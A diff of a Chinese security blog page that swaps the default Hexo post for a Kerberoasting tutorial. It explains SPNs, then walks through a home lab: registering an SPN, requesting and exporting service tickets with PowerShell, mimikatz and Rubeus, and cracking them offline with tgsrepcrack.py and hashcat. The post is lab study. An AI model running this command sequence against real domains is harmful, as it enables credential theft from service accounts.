@@ -13,24 +13,29 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="MiFuzz">
+  <meta name="author" content="mifuzz">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+    <meta name="description" content="前言我将使用chatGPT在前言对一些基础性知识进行解释。 需要说明，图片托管在github上，国内IP访问github资源加载速度极慢或者加载失败，请尽量使用国外IP访问。 什么是Kerberoast攻击 Kerberoast是一种用于攻击 Windows 域环境中使用的 Kerberos 身份验证协议的攻击技术。Kerberos 是一种安全的身份验证协议，用于在 Windows 域环境中进行用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="https://blog.dbii.top/posts/4a17b156/index.html">
-<meta property="og:site_name" content="MiFuzz&#39;s blog">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:title" content="Kerberoast攻击分析">
+<meta property="og:url" content="https://blog.dbii.top/posts/b244341">
+<meta property="og:site_name" content="mifuzz&#39;s blog">
+<meta property="og:description" content="前言我将使用chatGPT在前言对一些基础性知识进行解释。 需要说明，图片托管在github上，国内IP访问github资源加载速度极慢或者加载失败，请尽量使用国外IP访问。 什么是Kerberoast攻击 Kerberoast是一种用于攻击 Windows 域环境中使用的 Kerberos 身份验证协议的攻击技术。Kerberos 是一种安全的身份验证协议，用于在 Windows 域环境中进行用">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-05-26T10:18:13.691Z">
-<meta property="article:modified_time" content="2023-06-15T02:32:35.924Z">
-<meta property="article:author" content="MiFuzz">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125706148.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125851635.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529130759981.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529131206163.png">
+<meta property="article:published_time" content="2023-05-29T03:29:24.000Z">
+<meta property="article:modified_time" content="2023-07-03T01:18:01.945Z">
+<meta property="article:author" content="mifuzz">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125706148.png">
   
   
   
-  <title>Hello World - MiFuzz&#39;s blog</title>
+  <title>Kerberoast攻击分析 - mifuzz&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -72,7 +77,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"blog.dbii.top","root":"/","version":"1.9.4","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"Markdown"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+    var CONFIG = {"hostname":"blog.dbii.top","root":"/","version":"1.9.4","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"Markdown"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -214,7 +219,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle">Hello World</span>
+            <span id="subtitle">Kerberoast攻击分析</span>
           
         </div>
 
@@ -225,8 +230,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-05-26 18:18" pubdate>
-          2023年5月26日 晚上
+        <time datetime="2023-05-29 11:29" pubdate>
+          2023年5月29日 上午
         </time>
       </span>
     
@@ -237,7 +242,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          357 字
+          2.3k 字
         
       </span>
     
@@ -248,7 +253,7 @@
         
         
         
-          3 分钟
+          19 分钟
         
       </span>
     
@@ -286,24 +291,69 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Hello World</h1>
+            <h1 style="display: none">Kerberoast攻击分析</h1>
             
             
               <div class="markdown-body">
                 
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">"My New Post"</span><br></code></pre></td></tr></tbody></table></figure>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我将使用chatGPT在前言对一些基础性知识进行解释。</p>
+<p>需要说明，图片托管在github上，国内IP访问github资源加载速度极慢或者加载失败，请尽量使用国外IP访问。</p>
+<h3 id="什么是Kerberoast攻击"><a href="#什么是Kerberoast攻击" class="headerlink" title="什么是Kerberoast攻击"></a>什么是Kerberoast攻击</h3><blockquote>
+<p>Kerberoast是一种用于攻击 Windows 域环境中使用的 Kerberos 身份验证协议的攻击技术。Kerberos 是一种安全的身份验证协议，用于在 Windows 域环境中进行用户身份验证和授权。在 Kerberos 协议中，用户会向 Kerberos 服务器请求一个安全令牌（ticket），用于在 Windows 域环境中访问资源。</p>
+<p>Kerberoast 攻击利用了 Kerberos 协议中的漏洞，通过获取 Kerberos 中的服务票据（Service Ticket），并对其进行离线攻击，从而获取到目标用户的明文密码。攻击者可以利用 Kerberoast 攻击来在不知道用户密码的情况下获取到用户的密码哈希值，然后使用密码破解工具对其进行破解，最终获取到用户的明文密码。由于攻击者可以在离线环境中进行攻击，因此 Kerberoast 攻击可以避免被 Kerberos 协议的防护机制所检测到。</p>
+</blockquote>
+<h3 id="什么是SPN"><a href="#什么是SPN" class="headerlink" title="什么是SPN"></a>什么是SPN</h3><blockquote>
+<p>SPN（Service Principal Name）是指服务主体名称，是 Kerberos 身份验证协议中用于标识服务实例的唯一标识符。SPN 通常由服务名称和主机名组成，用于标识服务在网络上的唯一实例，帮助 Kerberos 协议正确地将服务票据（Service Ticket）授予给服务实例。</p>
+<p>在 Windows 域环境中，SPN 是非常重要的，因为 Kerberos 身份验证协议是 Windows 域环境中最常用的身份验证协议。如果 SPN 配置不正确，可能会导致 Kerberos 身份验证协议无法正常工作，从而影响到整个域环境的安全和稳定性。</p>
+</blockquote>
+<h4 id="SPN的类型"><a href="#SPN的类型" class="headerlink" title="SPN的类型"></a>SPN的类型</h4><ul>
+<li>一种是注册在活动目录的机器帐户（Computers）下。当一个服务的权限为 Local System 或 Network Service 时，则 SPN 注册在机器帐户（Computers）下。</li>
+<li>另一种是注册在活动目录的域用户帐户（Users）下，当一个服务的权限为一个域用户时，则 SPN 注册在域用户帐户（Users）下。</li>
+</ul>
+<p>域环境下执行命令：<code>setspn -q */*</code>查看当前域内所有SPN，SPN分类如下：</p>
+<p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN,默认有三个：</p>
+<p>域控制器：CN=DC,OU=Domain Controllers,DC=fraxdeo,DC=cn</p>
+<p>域用户帐户：CN=krbtgt,CN=Users,DC=fraxdeo,DC=cn</p>
+<p>机器帐户：CN=WIN7,CN=Computers,DC=fraxdeo,DC=cn</p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></h3><p>从内存中提取明文密码、散列、PIN 码和 kerberos 票据现在已广为人知。**<code>mimikatz</code>**还可以执行 pass-the-hash、pass-the-ticket 或 build <em>Golden tickets</em>。</p>
+<h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a></h3><p>Rubeus是一个 C# 工具集，是可以针对Kerberos协议进行攻击的工具,可以发起Kerberos请求,并将请求票据导入内存中,Rebeus提供了大量的用于Kerberos攻击的功能,比如TGT请求/ST请求/AS-REP Roasting攻击/Kerberoasting攻击/委派攻击/黄金票据/白银票据等。</p>
+<h3 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a><a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat">Hashcat</a></h3><p>hashcat工具的简介与使用可以参考：<a target="_blank" rel="noopener" href="https://goyasha.com/post/ZKgJ5d4Q/">本文</a></p>
+<hr>
+<p>工具的简介与使用互联网解释的比我好，上面工具罗列了他们的github地址，请参考</p>
+<h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p>域控：Windows service 2016</p>
+<p>​	同时安装SQL Server 2008 R2 </p>
+<p>​	同时创建用户mssql，密码sky@1321</p>
+<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">setspn -A MSSQLSvc/demo<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span>:<span class="hljs-number">1443</span> mssql<br></code></pre></td></tr></tbody></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></tbody></table></figure>
+<p>注册一条服务类为MSSQLSvc，主机为demo.test.com，端口为1433，注册在mssql域用户下</p>
+<figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">setspn -q <span class="hljs-strong">*/*</span><br></code></pre></td></tr></tbody></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></tbody></table></figure>
+<p>查看当前所有域</p>
+<figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Add</span>-<span class="hljs-keyword">Type</span> -AssemblyName <span class="hljs-keyword">System</span>.IdentityModel<br><span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/demo.test.com:1443"<br></code></pre></td></tr></tbody></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></tbody></table></figure>
+<p>请求SPNKerberos票据——单个服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125706148.png" srcset="/img/loading.gif" lazyload alt="image-20230529125706148"></p>
+<figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">klist</span><br></code></pre></td></tr></tbody></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>查看缓存中的所有票据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125851635.png" srcset="/img/loading.gif" lazyload alt="image-20230529125851635"></p>
+<p>使用Rubeus和mimikatz都可以导出票据</p>
+<figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::list /<span class="hljs-keyword">export</span>	<span class="hljs-comment">//mimikatz执行</span><br>Rubeus.exe kerberoast /outfile:hash.txt<br></code></pre></td></tr></tbody></table></figure>
+
+<p>mimikatz:kerberos::list /export</p>
+<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2.<span class="hljs-number">7</span> tgsrepcrack<span class="hljs-selector-class">.py</span> zidian<span class="hljs-selector-class">.txt</span> ex.kirbi<br></code></pre></td></tr></tbody></table></figure>
+
+<p>在kali安装kerberoast，使用kerberoast的tgsrepcrack.py离线破解票据ex.kirbi</p>
+<p>rubeus:<img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529130759981.png" srcset="/img/loading.gif" lazyload alt="image-20230529130759981"></p>
+<p>因为hashcat的运行模式，在虚拟机破解报错，我们在真机运行以下命令，尝试破解</p>
+<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat<span class="hljs-selector-class">.exe</span> -m <span class="hljs-number">13100</span> hash<span class="hljs-selector-class">.txt</span> ziidian.txt<br></code></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529131206163.png" srcset="/img/loading.gif" lazyload alt="image-20230529131206163"></p>
+<p>成功，可以看到密码sky@1321</p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>注册主机名要和后面请求票据时保持一致。</p>
+<p>demo是主机名，test.com是域控网址。</p>
+<p>zidian.txt是包含密码的字典，可能不包含你设置账户的密码，可以自行添加</p>
+<p>-m 13100是破解的散列值类型，可以这篇<a target="_blank" rel="noopener" href="https://goyasha.com/post/ZKgJ5d4Q/">文章</a>选择</p>
 
                 
               </div>
@@ -322,7 +372,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%92%8C%E7%BD%91%E7%BB%9C%E6%8A%80%E8%83%BD/" class="category-chain-item">计算机和网络技能</a>
+  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-chain-item">内网渗透</a>
   
   
 
@@ -342,26 +392,26 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Hello World</div>
-      <div>https://blog.dbii.top/posts/4a17b156/</div>
+      <div>Kerberoast攻击分析</div>
+      <div>https://blog.dbii.top/posts/b244341</div>
     </div>
     <div class="license-meta">
       
         <div class="license-meta-item">
           <div>作者</div>
-          <div>MiFuzz</div>
+          <div>mifuzz</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年5月26日</div>
+          <div>2023年5月29日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2023年6月15日</div>
+          <div>2023年7月3日</div>
         </div>
       
       
@@ -404,15 +454,21 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/155c2f89/" title="一台电脑SSH连接多个github账户的配置细节">
+                      <a href="/posts/bbf780e8" title="Windows 域环境的搭建">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">一台电脑SSH连接多个github账户的配置细节</span>
+                        <span class="hidden-mobile">Windows 域环境的搭建</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/posts/155c2f89" title="一台电脑SSH连接多个github账户的配置细节">
+                        <span class="hidden-mobile">一台电脑SSH连接多个github账户的配置细节</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
@@ -512,7 +568,7 @@
     <div class="footer-inner">
   
     <div class="footer-content">
-       <a>© 2023  </a> <i class="iconfont icon-love"></i> <a href="https://blog.dbii.top/about" target="_blank" rel="nofollow noopener"><span>MiFuzz</span></a> </br> <a>最难开口的事情就是 初次的问好 和最终的道别</a> 
+       <a>© 2023  </a> <i class="iconfont icon-love"></i> <a href="https://blog.dbii.top/about" target="_blank" rel="nofollow noopener"><span>mifuzz</span></a> </br> <a>最难开口的事情就是 初次的问好 和最终的道别</a> 
     </div>
   
   
